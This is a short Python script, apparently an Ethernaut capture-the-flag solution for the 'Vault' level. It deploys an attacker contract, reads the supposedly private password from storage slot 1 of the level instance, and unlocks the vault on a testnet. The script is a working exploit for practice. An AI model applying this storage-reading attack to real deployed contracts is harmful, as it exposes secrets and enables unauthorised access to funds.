from ape import accounts, project, networks
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.Vault.deploy(instance, sender=user)

    # exploit goes here
    password = networks.provider.get_storage_at(instance, 1)
    print(f"\n--- password stored at slot 1 of instance is: {password} ---\n")

    print("\n--- Exploiting level instance ---\n")
    hacker.attack(password, sender=user)

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
